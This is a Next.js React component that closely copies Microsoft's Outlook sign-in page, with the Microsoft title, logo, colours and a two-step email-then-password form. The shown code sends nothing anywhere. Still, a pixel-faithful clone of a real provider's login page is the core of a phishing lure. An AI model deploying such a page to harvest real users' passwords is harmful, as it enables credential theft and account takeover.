"use client";
import { useState } from "react";
import Head from "next/head";
import Image from "next/image";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState(1); // 1 = email, 2 = password

  const [error, setError] = useState<any>(null);

  const handleNext = () => {
    if (email === "") {
      setError("Enter a valid email address, phone number, or Skype name.");
    } else {
      setError("");
      setStep(2);
    }
  };

  return (
    <>
      <Head>
        <title>Sign in to your Microsoft account</title>
      </Head>

      <main className="relative min-h-screen flex-col items-center px-2 flex md:items-center md:justify-center bg-white">
        {/* Background */}
        <div className="absolute inset-0 hidden md:block bg-[url('/images/loginbg.svg')] bg-no-repeat bg-cover bg-center" />
        <div className=" flex-col flex w-fit">
          {/* Login Card */}
          <div className="relative z-10 bg-white md:w-[420px] md:p-[10px] md:h-[339px] md:shadow-md w-full max-w-md mx-4 sm:mx-auto overflow-hidden">
            <div
              className={`w-[200%] h-full flex transition-transform duration-500 ease-in-out ${
                step === 1 ? "translate-x-0" : "-translate-x-1/2"
              }`}
            >
              {/* Email Step */}
              <div className="w-1/2 px-3 py-4 sm:p-10">
                <img
                  src="/images/icon.png"
                  alt="Microsoft Logo"
                  className="mb-6 w-28 sm:w-24"
                />
                <div className="text-[#1b1b1b]">
                  <h1 className="text-xl  font-semibold">Sign in</h1>
                  <p className="text-xs">to continue to Outlook</p>
                </div>

                <p className=" text-sm text-red-500 mt-4">{error}</p>
                <input
                  type="email"
                  placeholder="Email, phone, or Skype"
                  className={`w-full border-b-1 border-[#1b1b1b] text-sm py-1 ${
                    error === "" && "border-red-500"
                  } mb-3 text-[#1b1b1b] focus:outline-none focus:ring-0`}
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
                <p className="text-sm text-gray-600 mb-6">
                  No account?{" "}
                  <a href="#" className="text-[#0067b8] hover:underline">
                    Create one!
                  </a>
                </p>
                <button
                  onClick={handleNext}
                  className="bg-[#0067b8] absolute w-[108px] h-[32px] right-0 md:right-[54%] text-sm md:bottom-10 bottom-3 flex items-center justify-center text-white py-2 transition"
                >
                  Next
                </button>
              </div>

              <div className="w-1/2 px-2 md:p-10 py-4 sm:p-3">
                <img
                  src="/images/icon.png"
                  alt="Microsoft Logo"
                  className="mb-2 w-28 sm:w-36"
                />
                <button
                  onClick={() => setStep(1)}
                  className="text-sm flex items-center text-[#1b1b1b] mb-2 hover:underline"
                >
                  <Image
                    src={"/images/arrow.svg"}
                    alt="arrow"
                    width={20}
                    height={20}
                  />
                  {email}
                </button>
                <h1 className="text-xl text-[#1b1b1b] font-semibold mb-3">
                  Enter password
                </h1>
                <input
                  type="password"
                  placeholder="Password"
                  className="w-full border-b-2 border-[#1b1b1b] focus:ring-blue-400  text-sm px-4 py-1 mb-3 text-[#1b1b1b] focus:outline-none focus:ring-0"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <p className="text-sm text-gray-600 mb-6">
                  No account?{" "}
                  <a href="#" className="text-[#0067b8] hover:underline">
                    Forgot password
                  </a>
                </p>
                <button className="bg-[#0067b8] absolute w-[108px] h-[32px] text-sm right-0 md:right-2 bottom-3 flex items-center justify-center text-white py-2 transition">
                  Sign in
                </button>
              </div>
            </div>
          </div>

          {/* Sign-in Options */}
          <div className="border-[1px] z-50 bg-white w-[366px] md:w-[420px] px-[24px] flex items-center py-[8px] mx-20 md:mt-5 mt-10 h-[48px]">
            <button className="flex items-center text-sm text-[#1b1b1b] hover:underline">
              <span className="mr-2">
                <Image
                  alt="key "
                  width={32}
                  height={32}
                  src={"/images/key.svg"}
                />
              </span>
              Sign-in options
            </button>
          </div>
        </div>

        {/* Footer */}
        <footer className="absolute bottom-16 w-full flex flex-wrap items-center text-xs text-gray-600 gap-3 px-4 sm:gap-6">
          <div className="flex items-center gap-3">
            <a href="#" className="hover:underline">
              Terms of use
            </a>
            <a href="#" className="hover:underline">
              Privacy & cookies
            </a>
            <span className="sm:inline">• • •</span>
          </div>
          <span className="block sm:hidden w-full mt-1">
            Use private browsing if this is not your device.{" "}
            <a href="#" className="text-blue-600 hover:underline">
              Learn more
            </a>
          </span>
        </footer>
      </main>
    </>
  );
}
